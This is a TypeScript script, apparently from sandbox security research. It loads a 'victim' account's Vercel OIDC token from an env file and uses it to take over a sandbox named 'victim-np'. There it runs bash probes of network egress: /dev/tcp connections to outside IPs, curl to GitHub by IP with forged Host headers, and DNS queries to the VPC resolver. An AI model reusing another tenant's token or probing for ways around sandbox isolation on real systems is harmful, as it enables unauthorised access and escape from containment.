import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", `
set +e
echo "=== confirm policy ==="
echo "=== A. raw TCP to various non-allowed IPs ==="
for ip in 140.82.112.4 1.1.1.1 142.250.190.46 104.16.132.229 8.8.8.8 20.43.161.146; do
  for p in 443 80 53; do
    if timeout 2 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null; then
      echo "OPEN $ip:$p"
    fi
  done
done
echo "=== B. HTTP via IP (github) with Host header ==="
timeout 5 curl -sk -o /dev/null -w "code=%{http_code}\\n" --max-time 4 --resolve github.com:443:140.82.112.4 https://github.com/ 2>&1 | tail -1
echo "=== C. HTTP to IP directly (no SNI/Host) ==="
timeout 5 curl -sk -o /dev/null -w "code=%{http_code}\\n" --max-time 4 https://140.82.112.4/ -H "Host: github.com" 2>&1 | tail -1
echo "=== D. plain HTTP to IP port 80 ==="
timeout 5 curl -s -o /dev/null -w "code=%{http_code}\\n" --max-time 4 http://140.82.112.4/ -H "Host: github.com" 2>&1 | tail -1
echo "=== E. does request to non-allowed IP carry brokered headers? check via httpbin ==="
timeout 5 curl -sk -o /tmp/h -w "code=%{http_code}\\n" --max-time 4 https://140.82.112.4/ -H "Host: github.com" -D - 2>&1 | head -5
head -c 300 /tmp/h 2>/dev/null; echo ""
echo "=== F. DNS: can we resolve via VPC for allowed? ==="
timeout 4 dig @172.31.0.2 example.com +time=3 +tries=1 2>&1 | grep -aE "ANSWER SECTION|IN" | head -3
echo "=== G. what does non-allowed DNS return (SERVFAIL?) ==="
timeout 4 dig @172.31.0.2 github.com +time=3 +tries=1 2>&1 | grep -aE "status|flags|rcvd" | head -3
echo DONE
`], { wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
